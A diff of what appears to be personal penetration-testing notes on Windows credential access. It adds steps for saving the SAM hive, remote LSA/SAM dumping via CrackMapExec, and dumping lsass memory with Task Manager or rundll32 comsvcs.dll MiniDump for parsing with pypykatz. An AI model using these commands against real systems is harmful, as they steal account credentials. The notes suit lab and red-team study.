@@ -1,4 +1,4 @@
-i## RunasCs.exe
+## RunasCs.exe
 Windows script to run specific processes under a different user account
 ```powershell
 PS > .\RunasCs.exe $Username $Password $Command
@@ -82,3 +82,25 @@ List any saved credentials and use them to run script:
 PS > cmdkey /list
 PS > runas /savecred /user:<user> C:\path\to\script
 ```
+
+# Local System
+If not connected to domain, extract #SAM-registry-hive with [[reg.exe]] 
+>Note: Need CMD with admin privilege.
+![[reg.exe#Save registry]]
+
+## Dumping LSA Secrets/SAM Remotely  ![[CrackMapExec#Dump LSA/SAM Remotely]] 
+## Dumping #lsass Process Memory
+### Using Task Manager (GUI)
+"Create Dump File" of Local Security Authority Process (LSAP) from Task Manager. It gets saved in `C:\Users\<user>\AppData\Local\Temp`. 
+### Using `rundll32.exe`
+- On CMD:
+```powershell
+PS > tasklist /svc
+```
+- On Powershell: 
+```PowerShell
+PS > Get-Process lsass
+PS > rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <destination> full
+```
+#### Tools
+- [[pypykatz]]
